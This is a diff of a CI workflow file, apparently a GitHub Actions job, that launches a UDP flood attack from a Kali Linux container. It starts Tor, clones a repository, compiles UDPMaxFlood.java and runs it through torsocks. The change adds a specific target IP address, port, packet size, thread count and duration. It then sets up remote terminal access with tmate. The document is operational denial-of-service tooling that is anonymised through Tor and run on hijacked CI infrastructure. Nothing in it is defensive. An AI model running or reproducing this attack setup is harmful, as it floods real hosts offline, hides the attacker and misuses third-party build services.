@@ -43,7 +43,7 @@ jobs:
           docker exec kali tmux send-keys -t attack \
             "echo 'Activando servicio Tor...'; service tor start; echo 'Estabilizando conexión a la red Tor (15s)...'; sleep 15; \
              git clone $REPO_URL /root/attack && cd /root/attack && javac UDPMaxFlood.java && \
-             echo 'Ejecución iniciada a través de la red Tor.'; torsocks java UDPMaxFlood" C-m
+             echo 'Ejecución iniciada a través de la red Tor.'; torsocks java UDPMaxFlood 34.38.250.9 25958 1472 8 600" C-m
 
           echo "### 7. Configurando y obteniendo la conexión SSH remota..."
           docker exec kali bash -c "echo 'set -g status off' > /root/.tmate.conf"
